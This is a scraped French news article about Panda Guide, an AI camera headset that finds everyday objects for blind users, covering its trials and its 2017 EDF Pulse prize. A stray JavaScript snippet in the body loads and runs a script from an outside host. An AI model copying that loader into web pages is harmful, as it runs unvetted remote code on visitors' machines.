{"title": "Panda Guide, des yeux pour les aveugles", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-11-24", "content": "Une petite camera sur la tete, un minuscule haut-parleur et un smartphone : voila le guide Panda, capable, grace a son intelligence artificielle, de reconnaitre des objets du quotidien. A la demande et vocalement, il en indique la direction. Ce systeme leger et malin a obtenu le prix EDF Pulse du public 2017. Une innovation etonnante... << Ou sont mes cles ? >>  demande la personne dont les  yeux  ne voient pas. Une voix sort du petit casque qu'elle  porte  sur la tete, declenchant la camera grand angle, et la guide vers le trousseau. L'idee ressemble a de la science-fiction. Plus facile a imaginer qu'a realiser... La jeune  start-up   Panda Guide , creee debut 2017, l'a fait. Actuellement en test, le systeme reconnait deja un millier d'objets. Car l'informatique qui est a l'oeuvre apprend a  reconnaitre des formes  dans n'importe quel environnement. Cet entrainement se passe bien.  << Nous devons selectionner les objets utiles , nous explique Jeremy Delage, responsable de la communication.  Nous donnons la priorite a la vie quotidienne et au monde du travail >>. L' application , qui tourne sur un telephone mobile, est en test chez une centaine de personnes deficientes visuelles. Ce sont elles qui aident a optimiser la recherche. L'entrainement de l' intelligence artificielle , lui, s'est appuye sur une communaute d'aveugles et de deficients visuels comptant 300 personnes. Chacune a repondu a des enquetes qui ont oriente les choix finaux. << Des yeux dans les oreilles >>  : c'est le credo de l'equipe de Panda Guide. Ce petit casque, leger, embarque une camera, un microphone et un haut-parleur. Relie a un smartphone, il recoit ses ordres par la voix de l'utilisateur, declenche la camera grand angle, analyse l'environnement pour reperer l'objet recherche et guide ensuite la personne vocalement. (c) Panda Guide                               Le defi du moment : lire les commandes tactiles Les essais doivent maintenant se poursuivre grandeur nature avec des beta-testeurs.  << Nous cherchons des volontaires en Ile-de-France >>,  confie Jeremy Delage. Le systeme complet n'a pas encore ete integre mais il existe un prototype fonctionnel, pour l'entrainement, et une maquette du casque, pour affiner l'ergonomie.  << Actuellement, par exemple, nous travaillons sur les  surfaces tactiles , de plus en plus nombreuses dans notre environnement immediat, les fours, les appareils electroniques, etc. Nous apprenons a les reperer. >>  Un systeme completement fonctionnel commencera ses essais debut 2018.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : EDF Pulse 2017 : decouvrez les laureats Le public qui a vote en ligne pour le  prix EDF Pulse 2017  ne s'est pas trompe. L'innovation a definitivement prouve ses possibilites. Depuis ce prix, remis le 19 septembre, des investisseurs se sont montres et Panda Guide prepare une levee de fonds. La petite equipe y trouvera des moyens supplementaires pour finaliser ce produit sans equivalent, qui sera propose  << au prix le plus bas possible >>  et qui a vocation a devenir un appareil medical homologue, et donc en partie remboursable. Que celles et ceux qui auraient envie de rejoindre cette entreprise le sachent : pour travailler chez Panda Guide, il faut commencer par vivre 24 heures dans le noir complet, afin de comprendre ce que represente une vie sans yeux... Panda, le guide pour aveugles                       Le petit casque Panda Guide, relie a un smartphone, peut reconnaitre un objet (cles, telephone, bouteille, ordinateur...). Il guide ensuite son utilisateur, comme nous l'explique Arnaud Lenglet, fondateur de la start-up.                                       ", "theme": "sante"}